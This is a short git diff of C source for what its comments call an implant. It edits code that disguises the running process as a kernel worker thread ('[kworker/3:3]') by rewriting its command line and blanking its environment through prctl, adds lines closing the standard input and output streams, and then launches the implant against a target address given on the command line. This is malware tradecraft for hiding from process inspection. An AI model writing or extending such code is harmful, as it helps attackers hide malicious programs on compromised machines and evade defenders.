@@ -26,7 +26,6 @@ int main(int argc, char **argv, char **envp) {
 
     // save the arg for later
     strncpy(target, argv[1], ip_len + 1);
-    static char *cmdline = "[kworker/3:3]";
 
     // process masquerading, change the command name associated with the process
     // empty out /proc/<PID>/cmdline
@@ -39,6 +38,10 @@ int main(int argc, char **argv, char **envp) {
     // kworker thread doesn't have any env variables
     prctl(PR_SET_MM, PR_SET_MM_ENV_START, &empty, NULL, NULL);
     prctl(PR_SET_MM, PR_SET_MM_ENV_END, &empty, NULL, NULL);
+
+    close(STDIN_FILENO);
+	close(STDOUT_FILENO);
+    close(STDERR_FILENO);
 
     implant_init_n_call(target);
     return 0;
